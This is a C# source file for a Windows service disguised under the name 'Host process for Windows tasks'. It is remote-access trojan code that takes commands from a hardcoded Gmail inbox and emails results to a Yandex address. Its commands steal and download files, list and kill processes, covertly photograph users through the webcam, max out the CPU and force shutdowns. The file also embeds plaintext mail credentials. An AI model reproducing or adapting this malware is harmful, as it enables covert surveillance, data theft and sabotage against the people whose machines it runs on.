using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Ionic.Zip;
using MailKit;
using MailKit.Net.Imap;
using MailKit.Net.Smtp;
using MimeKit;
using Хост_процесс_для_задач_Windows.Properties;

namespace Хост_процесс_для_задач_Windows
{
    public partial class ServiceRC : ServiceBase
    {
        private const string GlobalIDServer = "0000"; // Только 4 любых символа
        private const string MailAddress = "fivesevenom@gmail.com";
        private const string MailPassword = "health57";
        private const string SmtpServer = "smtp.gmail.com";
        private const int    SmtpPort = 465;
        private const string OutMail = "ottomayer57@yandex.ru";

        int NewMailCount;
        Thread Th;
        CancellationTokenSource CTS;

        public ServiceRC() => InitializeComponent();

        protected override void OnStart(string[] args)
        {
            Th = new Thread(StartServer) { IsBackground = true };
            Th.Start();
        }

        protected override void OnStop()
        {
            Settings.Default.Log += "\t" + DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + ": Сервер завершает работу\n";
            Settings.Default.Save();
        }

        private void StartServer()
        {
            byte Code = 0; // Переменная для контроля выключения/перезагрузки системы и сервера
            string Command = null;
            bool SendFile = false; // Задействована ли отправка файлов (вложения)

            Settings.Default.Log += "\t" + DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + ": Сервер запущен\n";
            Settings.Default.Save();

            while (true)
            {
                try
                {
                    using (ImapClient client = new ImapClient())
                    {
                        client.Connect("imap.gmail.com", 993, true);
                        client.Authenticate("fivesevenom@gmail.com", "health57");
                        IMailFolder inbox = client.Inbox;
                        inbox.Open(FolderAccess.ReadOnly);
                        if (inbox.Count > 0)
                            Command = inbox.GetMessage(inbox.Count - 1).TextBody;
                        else
                            break;
                    }

                    string message = null; // Переменная для ответа клиенту

                    string[] Com = { Command.Substring(0, 4), Command.Substring(4, 1), null, null, null, null }; // Буффер для комманд

                    if (Com[0] == GlobalIDServer) // id текущей копии сервера
                        break;

                    switch (Com[1])
                    {
                        case "%":
                            try
                            {
                                // Разбиваем строку на команды
                                Com[2] = Command.Substring(5, 1); // One command
                                Com[3] = Command.Substring(6, 1); // Two command
                                if (!Command.Contains("?"))
                                    Com[4] = Command.Substring(7); // One Path
                                else
                                {
                                    int a = Command.IndexOf("?", 7);
                                    Com[4] = Command.Substring(7, a - 7); // One Path
                                    Com[5] = Command.Substring(a + 1); // Two Path
                                }
                            }
                            catch (Exception ex) { message = "Error Com[%]: " + ex.Message; break; }

                            switch (Com[2])
                            {
                                case "D": // Directory
                                    try
                                    {
                                        switch (Com[3])
                                        {
                                            case "C": // Create
                                                Directory.CreateDirectory(Com[4]);
                                                message = string.Format("Директория по пути {0} создана", Com[4]);
                                                break;
                                            case "D": // Delete
                                                Directory.Delete(Com[4], true);
                                                message = string.Format("Директория по пути {0} удалена", Com[4]);
                                                break;
                                            case "M": // Move
                                                Directory.Move(Com[4], Com[5]);
                                                message = string.Format("Директория по пути {0} перемещена в {1}", Com[4], Com[5]);
                                                break;
                                        }
                                    }
                                    catch (Exception ex) { message = "Error Directory: " + ex.Message; }
                                    break;
                                case "F": // File
                                    try
                                    {
                                        switch (Com[3])
                                        {
                                            case "C": // Create
                                                using (FileStream stream = new FileStream(Com[4], FileMode.Create))
                                                {
                                                    message = string.Format("Файл по пути {0} создан", Com[4]);
                                                }
                                                break;
                                            case "D": // Delete
                                                File.Delete(Com[4]);
                                                message = string.Format("Файл по пути {0} удален", Com[4]);
                                                break;
                                            case "M": // Move
                                                File.Move(Com[4], Com[5]);
                                                message = string.Format("Файл по пути {0} перемещен в {1}", Com[4], Com[5]);
                                                break;
                                            case "L": // Download
                                                SendFile = true;
                                                message = "Файл успешно отправлен";
                                                break;
                                            case "U": // Upload
                                                new WebClient().DownloadFile(Com[4], Path.GetTempPath() + Com[5]);
                                                message = "Файл успешно скачан в " + Path.GetTempPath() + Com[5];
                                                break;
                                        }
                                    }
                                    catch (Exception ex) { message = "Error File: " + ex.Message; }
                                    break;
                                case "U": // Universal
                                    try
                                    {
                                        switch (Com[3])
                                        {
                                            case "Z": // Zipping
                                                Zipping(Com[4]);
                                                message = string.Format("Папка по пути {0} архивированна в {1}", Com[4], Path.GetTempPath() + "DumpData.zip");
                                                break;
                                            case "U": // UnZipping
                                                UnZipping(Com[4], Com[5]);
                                                message = string.Format("Архив по пути {0} распакован в папку {1}", Com[4], Com[5]);
                                                break;
                                                //case "P": // Port
                                                //    int port = Settings.Default.Port;
                                                //    Settings.Default.Port = Convert.ToInt32(Com[3]);
                                                //    Settings.Default.Save();
                                                //    message = string.Format("Текущий порт {0} был изменен на {1}", port, Com[3]);
                                                //    break;
                                        }
                                        break;
                                    }
                                    catch (Exception ex) { message = "Error Universal: " + ex.Message; }
                                    break;
                            }
                            break;
                        case "$":
                            try
                            {
                                // Разбиваем строку на команды
                                Com[2] = Command.Substring(5, 1); // One command

                                if (Command.Length > 6)
                                    Com[3] = Command.Substring(6, 1); // One Path
                            }
                            catch (Exception ex) { message = "Error Com[$]: " + ex.Message; break; }

                            switch (Com[2])
                            {
                                case "C": // Catalogs
                                    try
                                    {
                                        if (Com[3] == null || Com[3] == "")
                                            foreach (string s in Directory.GetLogicalDrives())
                                                message += s + "|";
                                        else
                                            foreach (string s in Directory.GetDirectories(Com[3]))
                                                message += s + "|";
                                    }
                                    catch (Exception ex) { message = "Error Catalogs: " + ex.Message; }
                                    break;
                                case "F": // Files
                                    try
                                    {
                                        foreach (string s in Directory.GetFiles(Com[3]))
                                            message += s + "|";
                                    }
                                    catch (Exception ex) { message = "Error Files: " + ex.Message; }
                                    break;
                                case "P": // Get List Process
                                    try
                                    {
                                        foreach (Process proc in Process.GetProcesses())
                                            message += proc.ProcessName + "|";
                                    }
                                    catch (Exception ex) { message = "Error GetListProcess: " + ex.Message; }
                                    break;
                                case "K": // Kill Process
                                    try
                                    {
                                        CloseProcess(Com[3]);
                                        message = string.Format("Процесс {0} закрыт", Com[3]);
                                    }
                                    catch (Exception ex) { message = "Error KillProcess: " + ex.Message; }
                                    break;
                                case "W": // WebCam
                                    try
                                    {
                                        new WebCamSc();
                                        handler.SendFile(Path.GetTempPath() + "DumpMemory.tmpbdw");
                                    }
                                    catch (Exception ex) { message = "Error WebCam: " + ex.Message; }
                                    break;
                                case "U": // KillCPU
                                    try
                                    {
                                        CTS = new CancellationTokenSource();
                                        for (int i = 0; i < Environment.ProcessorCount; i++)
                                            new Thread(Function).Start(CTS.Token);

                                        void Function(object obj)
                                        {
                                            CancellationToken token = (CancellationToken)obj;
                                            while (!token.IsCancellationRequested) { }
                                        }
                                        message = "Нагрузка процессора включена";
                                    }
                                    catch (Exception ex) { message = "Error KillCPU: " + ex.Message; }
                                    break;
                                case "I":
                                    try
                                    {
                                        CTS.Cancel();
                                        message = "Нагрузка процессора выключена";
                                    }
                                    catch (Exception ex) { message = "Error KillCPU: " + ex.Message; }
                                    break;
                            }
                            break;
                        default:
                            switch (Command.Substring(3))
                            {
                                case "con": // Connect
                                    message = "Сервер запущен. Ожидание подключений...";
                                    break;
                                case "l": // Log
                                    if (Settings.Default.Log == null)
                                        message = "В лог файле отсутствуют записи";
                                    else
                                        message = "\n" + Settings.Default.Log;
                                    break;
                                case "cl": // Clear Log
                                    Settings.Default.Log = null;
                                    Settings.Default.Save();
                                    message = "Лог файл очищен";
                                    break;
                                case "tmp": // Path Temp Folder
                                    message = "Временная папка пользователя: " + Path.GetTempPath();
                                    break;
                                case "sr": // System Reboot
                                    message = "Выполняется перезагрузка ОС...";
                                    Code = 1;
                                    break;
                                case "sfr": // System Forced Reboot
                                    message = "Выполняется принудительная перезагрузка ОС...";
                                    Code = 2;
                                    break;
                                case "se": // System Exit
                                    message = "Выполняется выключение ОС...";
                                    Code = 3;
                                    break;
                                case "sfe": // System Forced Exit
                                    message = "Выполняется принудительное выключение ОС...";
                                    Code = 4;
                                    break;
                                case "x": // Exit
                                    Process.GetCurrentProcess().Kill();
                                    break;
                                default:
                                    message = "Команда не определена";
                                    break;
                            }
                            break;
                    }

                    if (message == null)
                        message = "Сервер не ответил";

                    MimeMessage emailMessage = new MimeMessage();

                    emailMessage.From.Add(new MailboxAddress("RemoteControl", OutMail));
                    emailMessage.To.Add(new MailboxAddress(string.Empty, OutMail));
                    emailMessage.Subject = "Сервер: " + GlobalIDServer;
                    emailMessage.Body = new TextPart(MimeKit.Text.TextFormat.Html)
                    {
                        Text = message
                    };

                    if (SendFile)
                    {
                        BodyBuilder builder = new BodyBuilder
                        {
                            TextBody = ""
                        };
                        builder.Attachments.Add(Com[4]);
                        emailMessage.Body = builder.ToMessageBody();
                    }

                    using (SmtpClient client = new SmtpClient())
                    {
                        client.Connect(SmtpServer, SmtpPort, true);
                        client.Authenticate(MailAddress, MailPassword);
                        client.Send(emailMessage);
                        client.Disconnect(true);
                    }

                    if (Code != 0) // Управление выключением и перезагрузкой ОС
                    {
                        byte code = Code;
                        Code = 0;

                        switch (code)
                        {
                            case 1:
                                new Boot().Halt(true, false); // Мягкая перезагрузка
                                break;
                            case 2:
                                new Boot().Halt(true, true); // Жесткая перезагрузка
                                break;
                            case 3:
                                new Boot().Halt(false, false); // Мягкое выключение
                                break;
                            case 4:
                                new Boot().Halt(false, true); // Жесткое выключение
                                break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Settings.Default.Log += "\t" + DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + ": Ошибка сервера: " + ex.Message + "\n";
                    Settings.Default.Save();
                }
            }
        }

        private void Zipping(string path)
        {
            ZipFile zf = new ZipFile(Path.GetTempPath() + "DumpData.zip"); // КУДА МЫ БУДЕМ СОХРАНЯТЬ ГОТОВЫЙ АРХИВ
            zf.AddDirectory(path); // ЧТО МЫ БУДЕМ СЖИМАТЬ
            zf.Save();
        }

        private void UnZipping(string exFile, string exDir)
        {
            using (ZipFile zip = ZipFile.Read(exFile))
            {
                zip.ExtractAll(exDir, ExtractExistingFileAction.OverwriteSilently);
            }
        }

        private void CloseProcess(string name)
        {
            foreach (Process proc in Process.GetProcesses())
                if (proc.ProcessName.ToLower().Contains(name.ToLower()))
                    proc.Kill();
        }
    }

    class WebCamSc
    {
        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        public static extern IntPtr CapCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
        [DllImport("user32", EntryPoint = "SendMessage")]
        public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

        public WebCamSc()
        {
            IntPtr hWndC = CapCreateCaptureWindowA("VFW Capture", unchecked((int)0x80000000) | 0x40000000, 0, 0, 320, 240, 0, 0); // Узнать дескриптор камеры
            SendMessage(hWndC, 0x40a, 0, 0); // Подключиться к камере
            SendMessage(hWndC, 0x419, 0, Marshal.StringToHGlobalAnsi(Path.GetTempPath() + "DumpMemory.tmpbdw").ToInt32()); // Сохранить скриншот
            SendMessage(hWndC, 0x40b, 0, 0); // Отключить камеру
        }
    }

    class Boot
    {
        // Импортируем API функцию InitiateSystemShutdown
        [DllImport("advapi32.dll", EntryPoint = "InitiateSystemShutdownEx")]
        static extern int InitiateSystemShutdown(string lpMachineName, string lpMessage, int dwTimeout, bool bForceAppsClosed, bool bRebootAfterShutdown);
        // Импортируем API функцию AdjustTokenPrivileges
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        // Импортируем API функцию GetCurrentProcess
        [DllImport("kernel32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetCurrentProcess();
        // Импортируем API функцию OpenProcessToken
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        // Импортируем API функцию LookupPrivilegeValue
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        // Импортируем API функцию LockWorkStation
        [DllImport("user32.dll", EntryPoint = "LockWorkStation")]
        static extern bool LockWorkStation();
        // Объявляем структуру TokPriv1Luid для работы с привилегиями
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }

        // Объявляем необходимые, для API функций, константые значения, согласно MSDN
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";

        private void SetPriv() // Функция SetPriv для повышения привилегий процесса
        {
            TokPriv1Luid tkp; // Экземпляр структуры TokPriv1Luid 
            IntPtr htok = IntPtr.Zero;

            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok)) // Открываем "интерфейс" доступа для своего процесса
            {
                // Заполняем поля структуры
                tkp.Count = 1;
                tkp.Attr = SE_PRIVILEGE_ENABLED;
                tkp.Luid = 0;
                LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, ref tkp.Luid); // Получаем системный идентификатор необходимой нам привилегии
                AdjustTokenPrivileges(htok, false, ref tkp, 0, IntPtr.Zero, IntPtr.Zero); // Повышем привилигеию своему процессу
            }
        }

        public int Halt(bool RSh, bool Force) // Публичный метод для перезагрузки/выключения машины
        {
            SetPriv(); // Получаем привилегия
            return InitiateSystemShutdown(null, null, 0, Force, RSh); // Вызываем функцию InitiateSystemShutdown, передавая ей необходимые параметры
        }

        public int Lock() => LockWorkStation() ? 1 : 0; // Публичный метод для блокировки операционной системы
    }
}
